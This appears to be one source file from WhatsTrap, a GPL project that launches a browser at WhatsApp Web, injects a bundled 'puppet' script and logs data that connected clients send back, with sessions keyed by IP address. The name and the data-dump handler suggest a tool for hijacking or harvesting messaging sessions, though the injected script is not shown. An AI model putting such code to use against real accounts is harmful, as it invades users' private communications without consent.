/**
 * @file lib/puppeteer.js
 *
 * Copyright (C) 2018 | Giacomo Trudu aka `Wicker25`
 *
 * This file is part of WhatsTrap.
 *
 * WhatsTrap is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * WhatsTrap is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with WhatsTrap. If not, see <https://www.gnu.org/licenses/>.
 */

const Browser = require('./browser');
const Dispatcher = require('./dispatcher');

/**
 * The Puppeteer launches the browse instance and inject the Puppet into the webpage.
 */
class Puppeteer {
    constructor() {
        this._dispatcher = null;
        this._dumper = null;
        this._sessions = {};
    }

    async live() {
        this._dispatcher = new Dispatcher({ port: 8085 });
        console.log('Waiting for connection...');

        this._dispatcher.on('connection', async (client, request) => {
            client.remoteAddress = request.connection.remoteAddress;
            console.log('Connected with ' + client.remoteAddress);
        });

        this._dispatcher
            .on('start_session', this._startSession.bind(this))
            .on('stop_session',  this._stopSession.bind(this))
            .on('dump_data',     this._dumpData.bind(this));
    };

    async _startSession(client) {
        const session = this._accessSession(client);

        if (session.browser) {
            session.browser.stop();
        }

        const browser = new Browser('https://web.whatsapp.com/');

        await browser.launch();
        await browser.injectJS('./dist/bootstrap.js', 'WhatsTrapp.launchPuppet();');

        session.browser = browser;
    }

    async _stopSession(client) {
        const session = this._accessSession(client);

        if (session.browser) {
            session.browser.stop();
        }
    }

    async _dumpData(client, data) {
        const session = this._accessSession(client);

        if (!this._dumper) {
            console.log(client.remoteAddress, 'DUMP:', data);
            return;
        }

        this._dumper(client, data);  // TODO: create a setter method for it
    }

    _accessSession(client) {
        const remoteAddress = client.remoteAddress;

        if (typeof this._sessions[remoteAddress] === 'undefined') {
            this._sessions[remoteAddress] = {};
        }

        return this._sessions[remoteAddress];
    }
}

module.exports = Puppeteer;
